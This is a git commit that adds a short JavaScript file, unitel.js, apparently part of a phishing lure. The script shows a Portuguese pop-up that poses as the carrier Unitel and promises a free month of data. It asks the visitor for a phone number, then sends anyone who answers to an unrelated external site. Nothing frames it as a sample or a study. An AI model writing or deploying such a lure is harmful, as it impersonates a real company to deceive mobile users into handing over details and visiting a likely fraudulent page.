34dcb3710e511b9cfa1d941aa25390edee9190d8
newetijazz20 <newetijazz20@gmail.com>
2026-02-13 10:58:09 +0100

    Create unitel.js

---
+++ unitel.js
@@ -0,0 +1,5 @@
+var password = 'ATIVE AGORA'
+password=prompt('Unitel: Parabéns! Seu número Unitel está qualificado para receber 1 mês de dados grátis. Clique em OK para inserir seu número de celular.','ATIVE AGORA');
+if (password != 'ATIVE AGORA') {
+location.href='https://www.krhitid.site/Unitel';
+}
